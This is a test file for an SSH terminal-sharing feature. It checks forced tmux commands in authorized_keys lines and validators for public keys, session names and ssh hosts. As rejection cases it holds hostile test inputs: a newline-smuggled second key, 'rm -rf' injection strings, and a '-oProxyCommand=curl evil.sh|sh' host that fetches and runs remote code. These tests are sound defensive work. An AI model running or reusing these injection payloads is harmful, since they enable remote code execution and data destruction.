import { describe, it, expect } from "vitest";
import { ACCESS_COPY, authorizedKeyLine, connectCommand, looksLikePublicKey, looksLikeSshHost, teammateHosts, tmuxName } from "./sshShare";

const KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJx5Q2v8bW9yZXN0dWZmaGVyZQ== aryan@mac";

describe("the line can only ever grant one session", () => {
  it("watch-only attaches read-only, so their keys go nowhere", () => {
    const line = authorizedKeyLine("watch", KEY, "me")!;
    expect(line).toContain('command="tmux attach -r -t grillme-me"');
    expect(line).not.toContain("tmux new");
  });

  it("type mode shares the terminal", () => {
    expect(authorizedKeyLine("type", KEY, "me")!).toContain('command="tmux new -A -s grillme-me"');
  });

  it("closes forwarding, which a forced command leaves open on its own", () => {
    const line = authorizedKeyLine("type", KEY, "me")!;
    for (const o of ["no-port-forwarding", "no-agent-forwarding", "no-X11-forwarding", "no-user-rc"]) {
      expect(line).toContain(o);
    }
  });

  it("grants nothing when access is off", () => {
    expect(authorizedKeyLine("off", KEY, "me")).toBeNull();
  });
});

describe("a pasted key cannot smuggle in a second entry", () => {
  it("refuses a key containing a newline — the whole attack", () => {
    // authorized_keys is line-oriented: a second line would carry no forced
    // command, which is unrestricted shell access
    const evil = `${KEY}\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyHere== attacker@box`;
    expect(looksLikePublicKey(evil)).toBe(false);
    expect(authorizedKeyLine("watch", evil, "me")).toBeNull();
    expect(authorizedKeyLine("type", `${KEY}\r\nssh-rsa AAAAB3NzaC1yc2E=`, "me")).toBeNull();
  });

  it("refuses a private key pasted by mistake", () => {
    expect(looksLikePublicKey("-----BEGIN OPENSSH PRIVATE KEY-----")).toBe(false);
  });

  it("refuses junk, and accepts the formats people actually have", () => {
    expect(looksLikePublicKey("hello")).toBe(false);
    expect(looksLikePublicKey("")).toBe(false);
    expect(looksLikePublicKey(KEY)).toBe(true);
    expect(looksLikePublicKey("ssh-rsa AAAAB3NzaC1yc2EAAAA")).toBe(true);
    expect(looksLikePublicKey("ecdsa-sha2-nistp256 AAAAE2VjZHNh")).toBe(true);
    expect(looksLikePublicKey("sk-ssh-ed25519@openssh.com AAAAGnNr yubikey")).toBe(true);
  });
});

describe("the tmux name stays inside what the Rust side validates", () => {
  it("only [A-Za-z0-9._-] survives, and it never leads with a dash", () => {
    expect(tmuxName("me")).toBe("grillme-me");
    expect(tmuxName("feat/some branch")).toBe("grillme-feat-some-branch");
    expect(tmuxName("--rm")).toBe("grillme-rm"); // leading dashes stripped, so no flag-lookalike
    expect(tmuxName("")).toBe("grillme-session");
    for (const id of ["me", "a b", "x;rm -rf /", "../../etc", ""]) {
      expect(tmuxName(id)).toMatch(/^[A-Za-z0-9._-]+$/);
      expect(tmuxName(id).startsWith("-")).toBe(false);
    }
  });

  it("a session id with shell characters cannot break out of the command", () => {
    const line = authorizedKeyLine("type", KEY, 'x"; rm -rf ~; #')!;
    // the quote that would close command="..." must not survive
    expect(line.match(/"/g)!.length).toBe(2);
  });
});

describe("what the teammate runs", () => {
  it("is just ssh — the forced command decides the rest", () => {
    expect(connectCommand("aryan@macbook.local")).toBe("ssh -t aryan@macbook.local");
  });
});

describe("what each level actually grants, verified against tmux 3.5a", () => {
  it("watch-only is attach -r, which an interactive client cannot escape", () => {
    // tested by hand against a live server: with `attach -r`, new-window,
    // run-shell and switch-client are all refused for the attached client.
    // So the line really does grant one session and nothing else.
    expect(authorizedKeyLine("watch", KEY, "me")).toContain("tmux attach -r -t");
  });

  it("type mode is not contained, and the copy must not imply it is", () => {
    // `new -A` attaches a normal client: prefix + :new-window runs anything.
    // Even without that, typing into an agent started with
    // --dangerously-skip-permissions is arbitrary execution by another route.
    expect(authorizedKeyLine("type", KEY, "me")).toContain("tmux new -A -s");
    expect(ACCESS_COPY.type.detail).toMatch(/shell on your Mac/i);
    expect(ACCESS_COPY.type.detail).toMatch(/any command/i);
  });

  it("watch-only copy does not overclaim either", () => {
    expect(ACCESS_COPY.watch.detail).toMatch(/read-only/i);
    expect(ACCESS_COPY.watch.detail).not.toMatch(/shell on your Mac/i);
  });
});

describe("connecting to their Mac", () => {
  it("refuses a host ssh would read as an option — the one that matters", () => {
    expect(looksLikeSshHost("-oProxyCommand=curl evil.sh|sh")).toBe(false);
    expect(looksLikeSshHost("host; rm -rf ~")).toBe(false);
    expect(looksLikeSshHost("host and more")).toBe(false);
    expect(looksLikeSshHost("")).toBe(false);
  });

  it("accepts what people actually type", () => {
    expect(looksLikeSshHost("aryan@macbook.local")).toBe(true);
    expect(looksLikeSshHost("macbook-air.tail7a41d0.ts.net")).toBe(true);
    expect(looksLikeSshHost("  nandan@192.168.1.4  ")).toBe(true);
  });

  it("reads back only usable hosts, ignoring junk in the blob", () => {
    expect(teammateHosts({ teammateHosts: { m1: "a@b", m2: "  ", m3: 7 } })).toEqual({ m1: "a@b" });
    expect(teammateHosts(undefined)).toEqual({});
    expect(teammateHosts({ teammateHosts: ["nope"] })).toEqual({});
  });

  it("the tmux name is derived from their session, never typed", () => {
    // a typo here attaches to a session that does not exist and shows an empty
    // terminal with no error — the worst failure mode this feature has
    expect(tmuxName("me")).toBe("grillme-me");
    expect(tmuxName("s2")).toBe("grillme-s2");
  });
});
